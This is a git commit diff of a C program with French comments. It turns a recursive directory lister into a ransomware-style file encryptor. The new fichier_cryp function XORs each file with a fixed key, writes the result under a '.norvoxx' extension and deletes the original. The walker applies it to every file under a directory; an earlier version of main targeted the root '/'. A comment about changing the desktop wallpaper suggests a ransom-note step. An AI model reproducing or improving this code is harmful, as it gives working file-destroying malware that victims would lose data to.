053043897935228a90c358d389c925f910cc7ab5
ubuntu <foenix208@gmail.com>
2025-02-25 01:12:29 +0100

    implementation degueu

--- main.c
+++ main.c
@@ -4,10 +4,29 @@
 #include <unistd.h>
 #include <string.h>
 
-//ajouter des verification de permision de utilisation de stat pour plus de portabiliter
+// ajouter des verification de permision de utilisation de stat pour plus de portabiliter
 // changer fond ecrant linux commande
+void fichier_cryp(char *path,int key){
+    char new[255];
+    strcpy(new,path);
+    strcat(new,".norvoxx");
 
+    FILE *fichier_in = fopen(path,"rb");
+    FILE *fichier_cry = fopen(new,"wb");
 
+    if (fichier_in == NULL || fichier_cry == NULL)
+        return;
+
+    int buffer;
+    while (fread(&buffer, sizeof(int), 1, fichier_in) == 1){
+        buffer ^= key;
+        fwrite(&buffer , sizeof(int),1,fichier_cry);
+        //printf("%d",buffer);
+    }
+    fclose(fichier_in);
+    fclose(fichier_cry);
+    remove(path);
+}
 void fichier_liste(char *path){
     DIR *rep = opendir(path);
     if (rep == NULL)
@@ -15,8 +34,13 @@ void fichier_liste(char *path){
     struct dirent *file;
     while ((file = readdir(rep)) != NULL)
     {
-        if (file->d_type == 8)
-            printf("%s%s \n",path,file->d_name);
+        if (file->d_type == 8){
+            char full_path[255];
+            strcpy(full_path,path);
+            strcat(full_path,file->d_name);
+            
+            fichier_cryp(full_path,131269);
+        }
         if (file->d_type == 4)
         {
             char new_path[2064];
@@ -24,17 +48,15 @@ void fichier_liste(char *path){
             {
                 strcpy(new_path,path);
                 strcat(strcat(new_path,file->d_name),"/");
-                printf("%s \n",new_path);
-                
                 fichier_liste(new_path);
             }
         }
     }
 }
-
 int main(int argc, char const *argv[])
 {
     /* code */
-    fichier_liste("/");
+    fichier_liste("./toto/");
+    //fichier_cryp("toto.txt","toto",123121312);
     return 0;
 }
